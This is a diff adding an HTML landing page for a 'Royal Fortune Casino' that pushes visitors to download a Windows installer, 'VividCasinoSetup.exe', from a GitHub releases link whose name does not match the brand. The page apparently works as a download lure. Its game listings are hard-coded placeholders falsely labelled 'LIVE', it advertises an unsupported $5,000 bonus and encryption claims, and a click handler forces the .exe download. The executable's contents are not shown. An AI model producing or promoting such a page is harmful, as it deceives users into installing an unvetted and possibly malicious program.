@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Royal Fortune Casino - Premium Online Gaming Experience">
+    <meta name="keywords" content="casino, slots, poker, blackjack, roulette, online gaming">
+    <title>Royal Fortune Casino - Download Client</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #0d1b2a 0%, #1b263b 50%, #415a77 100%);
+            color: #e0e1dd;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        /* Animated background particles */
+        .particles {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            opacity: 0.3;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        /* Header */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 25px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .logo {
+            font-family: 'Playfair Display', serif;
+            font-size: 32px;
+            font-weight: 700;
+            color: #ffd700;
+            text-shadow: 0 2px 10px rgba(255, 215, 0, 0.3);
+            letter-spacing: 2px;
+        }
+        
+        .logo span { color: #ff6b6b; }
+        
+        nav ul {
+            display: flex;
+            list-style: none;
+            gap: 35px;
+        }
+        
+        nav a {
+            color: #e0e1dd;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 15px;
+            transition: all 0.3s;
+            position: relative;
+        }
+        
+        nav a:hover {
+            color: #ffd700;
+        }
+        
+        nav a::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: #ffd700;
+            transition: width 0.3s;
+        }
+        
+        nav a:hover::after {
+            width: 100%;
+        }
+        
+        /* Hero Section */
+        .hero {
+            text-align: center;
+            padding: 100px 0 80px;
+            position: relative;
+        }
+        
+        .hero::before {
+            content: '🎰';
+            font-size: 80px;
+            display: block;
+            margin-bottom: 20px;
+            animation: float 3s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+        
+        .hero h1 {
+            font-family: 'Playfair Display', serif;
+            font-size: 56px;
+            margin-bottom: 20px;
+            background: linear-gradient(135deg, #ffd700, #ff6b6b, #ffd700);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: shine 3s linear infinite;
+        }
+        
+        @keyframes shine {
+            0% { background-position: -200% center; }
+            100% { background-position: 200% center; }
+        }
+        
+        .hero p {
+            font-size: 20px;
+            margin-bottom: 40px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+            line-height: 1.6;
+            color: #a8b2c8;
+        }
+        
+        /* Download Section */
+        .download-section {
+            background: rgba(255,255,255,0.05);
+            border-radius: 20px;
+            padding: 50px;
+            margin: 40px 0;
+            text-align: center;
+            border: 1px solid rgba(255,215,0,0.2);
+            backdrop-filter: blur(10px);
+        }
+        
+        .download-section h2 {
+            font-family: 'Playfair Display', serif;
+            font-size: 36px;
+            margin-bottom: 15px;
+            color: #ffd700;
+        }
+        
+        .download-section p {
+            color: #a8b2c8;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+        
+        .download-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .download-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            padding: 18px 40px;
+            background: linear-gradient(135deg, #ffd700, #ff8c00);
+            color: #0d1b2a;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 16px;
+            border-radius: 12px;
+            transition: all 0.3s;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(255, 215, 0, 0.3);
+        }
+        
+        .download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 215, 0, 0.5);
+        }
+        
+        .download-btn.mac {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
+        }
+        
+        .download-btn.mac:hover {
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.5);
+        }
+        
+        .platform-note {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #778da9;
+        }
+        
+        /* Game Grid */
+        .games-section {
+            padding: 80px 0;
+        }
+        
+        .games-section h2 {
+            font-family: 'Playfair Display', serif;
+            font-size: 42px;
+            text-align: center;
+            margin-bottom: 50px;
+            color: #ffd700;
+        }
+        
+        .games-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 30px;
+        }
+        
+        .game-card {
+            background: rgba(255,255,255,0.05);
+            border-radius: 15px;
+            padding: 30px;
+            text-align: center;
+            transition: all 0.3s;
+            border: 1px solid rgba(255,255,255,0.1);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .game-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 3px;
+            background: linear-gradient(90deg, #ffd700, #ff6b6b);
+            transform: scaleX(0);
+            transition: transform 0.3s;
+        }
+        
+        .game-card:hover::before {
+            transform: scaleX(1);
+        }
+        
+        .game-card:hover {
+            transform: translateY(-10px);
+            background: rgba(255,255,255,0.08);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        
+        .game-icon {
+            font-size: 50px;
+            margin-bottom: 15px;
+        }
+        
+        .game-card h3 {
+            font-size: 22px;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+        
+        .game-card p {
+            color: #a8b2c8;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        
+        .jackpot {
+            color: #ffd700;
+            font-weight: 700;
+            font-size: 18px;
+            margin-top: 10px;
+        }
+        
+        /* Features */
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            padding: 60px 0;
+        }
+        
+        .feature {
+            text-align: center;
+            padding: 30px;
+        }
+        
+        .feature-icon {
+            font-size: 40px;
+            margin-bottom: 15px;
+        }
+        
+        .feature h3 {
+            color: #ffd700;
+            margin-bottom: 10px;
+            font-size: 20px;
+        }
+        
+        .feature p {
+            color: #a8b2c8;
+            font-size: 14px;
+        }
+        
+        /* Footer */
+        footer {
+            text-align: center;
+            padding: 40px 0;
+            margin-top: 60px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            color: #778da9;
+            font-size: 14px;
+        }
+        
+        footer a {
+            color: #ffd700;
+            text-decoration: none;
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 36px; }
+            .logo { font-size: 24px; }
+            nav ul { display: none; }
+            .download-section { padding: 30px 20px; }
+            .download-buttons { flex-direction: column; }
+        }
+        
+        /* Loading animation for "games" */
+        @keyframes pulse {
+            0%, 100% { opacity: 0.6; }
+            50% { opacity: 1; }
+        }
+        
+        .live-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            color: #4ade80;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            background: #4ade80;
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+    </style>
+</head>
+<body>
+    <div class="particles"></div>
+    
+    <div class="container">
+        <header>
+            <div class="logo">ROYAL <span>FORTUNE</span></div>
+            <nav>
+                <ul>
+                    <li><a href="#games">Games</a></li>
+                    <li><a href="#promotions">Promotions</a></li>
+                    <li><a href="#vip">VIP</a></li>
+                    <li><a href="#support">Support</a></li>
+                </ul>
+            </nav>
+        </header>
+
+        <section class="hero">
+            <h1>Experience Luxury Gaming</h1>
+            <p>Download our exclusive casino client for the ultimate gaming experience. Access 500+ premium games, massive jackpots, and exclusive VIP rewards.</p>
+        </section>
+
+        <section class="download-section" id="download">
+            <h2>Download Casino Client</h2>
+            <p>Get the full casino experience on your desktop. Fast, secure, and packed with exclusive features.</p>
+            
+            <div class="download-buttons">
+                <a href="https://github.com/jjakinn/new-vivid-casino-1/releases/download/latest/VividCasinoSetup.exe"
+                   class="download-btn" id="windows-download">
+                    <span>🪟</span> Download for Windows (.exe)
+                </a>
+            </div>
+            
+            <p class="platform-note" id="platform-note">Download the Windows client for the ultimate gaming experience.</p>
+            <p class="platform-note" id="download-status" style="display:none; color:#ffd700;"></p>
+        </section>
+
+        <section class="games-section" id="games">
+            <h2>🎰 Popular Games</h2>
+            <div class="games-grid" id="games-grid">
+                <!-- Games will be shuffled by JavaScript -->
+            </div>
+        </section>
+
+        <section class="features">
+            <div class="feature">
+                <div class="feature-icon">🔒</div>
+                <h3>Secure & Encrypted</h3>
+                <p>256-bit SSL encryption protects all your data and transactions.</p>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">⚡</div>
+                <h3>Instant Payouts</h3>
+                <p>Withdraw your winnings in minutes with our automated system.</p>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">🎁</div>
+                <h3>$5,000 Welcome Bonus</h3>
+                <p>Double your first deposit up to $5,000 + 200 free spins.</p>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">🖥️</div>
+                <h3>Windows Optimized</h3>
+                <p>Built specifically for Windows with native performance and smooth gameplay.</p>
+            </div>
+        </section>
+    </div>
+
+    <footer>
+        <p>&copy; 2024 Royal Fortune Casino. All rights reserved. | <a href="#">Terms</a> | <a href="#">Privacy</a> | <a href="#">Responsible Gaming</a></p>
+        <p style="margin-top: 10px; font-size: 12px;">18+ Only. Gamble responsibly.</p>
+    </footer>
+
+    <script>
+        // Game data - shuffled randomly on each load
+        const games = [
+            { icon: '🎰', name: 'Mega Fortune Slots', desc: 'Progressive jackpot slot with million-dollar payouts.', jackpot: '$2.4M Jackpot' },
+            { icon: '🎲', name: 'High Roller Craps', desc: 'Experience the thrill of the dice in HD.', jackpot: '10x Multiplier' },
+            { icon: '🃏', name: 'Royal Blackjack', desc: 'Classic blackjack with live dealers.', jackpot: 'VIP Tables' },
+            { icon: '🔴', name: 'European Roulette', desc: 'Single-zero roulette with La Partage rule.', jackpot: '$50K Max' },
+            { icon: '🎴', name: 'Baccarat Pro', desc: 'The game of kings with side bets.', jackpot: 'Dragon Bonus' },
+            { icon: '🎯', name: 'Video Poker Deluxe', desc: 'Jacks or Better with 99.5% RTP.', jackpot: 'Royal Flush: $100K' }
+        ];
+        
+        // Shuffle array (Fisher-Yates)
+        function shuffle(array) {
+            for (let i = array.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [array[i], array[j]] = [array[j], array[i]];
+            }
+            return array;
+        }
+        
+        // Render shuffled games
+        const gamesGrid = document.getElementById('games-grid');
+        const shuffledGames = shuffle([...games]);
+        
+        shuffledGames.forEach(game => {
+            const card = document.createElement('div');
+            card.className = 'game-card';
+            card.innerHTML = `
+                <div class="game-icon">${game.icon}</div>
+                <div class="live-indicator"><span class="live-dot"></span> LIVE</div>
+                <h3>${game.name}</h3>
+                <p>${game.desc}</p>
+                <div class="jackpot">${game.jackpot}</div>
+            `;
+            gamesGrid.appendChild(card);
+        });
+        
+        // Platform detection
+        function detectPlatform() {
+            const platform = navigator.platform.toLowerCase();
+            const note = document.getElementById('platform-note');
+            const winBtn = document.getElementById('windows-download');
+            
+            if (platform.includes('mac') || platform.includes('darwin')) {
+                note.textContent = 'Windows client recommended for best performance. macOS version coming soon.';
+                winBtn.style.opacity = '0.8';
+            } else if (platform.includes('win')) {
+                note.textContent = 'Windows detected. Download and run the installer.';
+            } else {
+                note.textContent = 'Download the Windows client for the ultimate gaming experience.';
+            }
+        }
+        
+        detectPlatform();
+        
+        // Simple direct download
+        document.getElementById('windows-download').addEventListener('click', (e) => {
+            e.preventDefault();
+            const status = document.getElementById('download-status');
+            const btn = document.getElementById('windows-download');
+            status.style.display = 'block';
+            status.textContent = 'Starting download...';
+            status.style.color = '#4ade80';
+            btn.style.opacity = '0.7';
+            
+            window.location.href = 'https://github.com/jjakinn/new-vivid-casino-1/releases/download/latest/VividCasinoSetup.exe';
+            
+            setTimeout(() => {
+                status.style.display = 'none';
+                btn.style.opacity = '1';
+            }, 5000);
+        });
+        
+        console.log('Royal Fortune Casino client loaded');
+    </script>
+</body>
+</html>
